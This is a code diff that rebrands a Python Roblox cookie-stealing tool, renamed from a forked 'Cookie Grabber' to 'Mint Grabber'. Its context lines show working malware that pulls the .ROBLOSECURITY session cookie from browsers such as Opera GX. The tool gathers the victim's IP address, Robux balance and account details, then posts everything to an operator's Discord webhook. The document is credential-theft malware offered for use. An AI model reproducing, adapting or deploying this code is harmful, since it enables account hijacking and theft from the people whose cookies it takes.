@@ -7,7 +7,7 @@ try:
 except Exception as e:
     print(str(e)[16:].replace("'", "") + ' is not installed, run install.bat first.'), exit()
 
-class SMTHGRB:
+class MINTGRB:
     def __init__(self, webhook: str):
         if not "discord.com/api/webhooks/" in webhook:
             print('You did not provide a webhook on Line 148.'), exit()
@@ -41,7 +41,7 @@ class SMTHGRB:
                 "description": f"Username: **{user['UserName']}**\nRobux: **R${int(user['RobuxBalance']):,}**\nPremium: **{user['IsPremium']}**\nCreated: **{robloxpy.User.External.CreationDate(id, 1)}** (*{int(robloxpy.User.External.GetAge(id)):,} days ago*)\nRAP: **{int(robloxpy.User.External.GetRAP(id)):,}**\nFriends: **{int(robloxpy.User.Friends.External.GetCount(id)):,}**\n\nIP Address: ||**{ip}**||\n\nCookie:\n||```fix\n{self.cookie}```||",
                 "color": 12452044,
                 "footer": {
-                    "text": "v2.2.2 ; Forked from Mani175's Cookie Grabber"
+                    "text": "v1.4.6 ; Mint Cookie Grabber"
                 }
             }
         )
@@ -90,7 +90,7 @@ class SMTHGRB:
             pass
 
         try:
-            self.platform = "Opera GX"
+            self.platform = "Opera GX" ## OPERA GX IS A W
             for cookie in browser_cookie3.opera_gx(domain_name='roblox.com'):
                 if cookie.name == '.ROBLOSECURITY':
                     self.cookie = cookie.value
@@ -146,11 +146,11 @@ class SMTHGRB:
 
     def send(self):
         requests.post(self.webhook, json={
-            "username": "ꜱᴏᴍᴇᴛʜɪɴɢ's .ROBLOSECURITY Grabber",
+            "username": "Mint Grabber",
             "content": "@everyone", #You can change this to be just no ping or a @here ping.
-            "avatar_url": "https://cdn.discordapp.com/avatars/1095069808774619156/752d6e8299111d82cae5b9d7305b02ba.png?size=4096",
+            "avatar_url": "https://media.discordapp.net/attachments/1146197830780846162/1171301163329658940/Turtle.png?ex=655c2e37&is=6549b937&hm=086426c867855902e535d8a33e2396fc90a719904d26f1ffc0fb489dfd10e307&=&width=763&height=572",
             "embeds": self.embeds
         })
 
 
-SMTHGRB("%WEBHOOKHERE%")
+MINTGRB("%WEBHOOKHERE%")
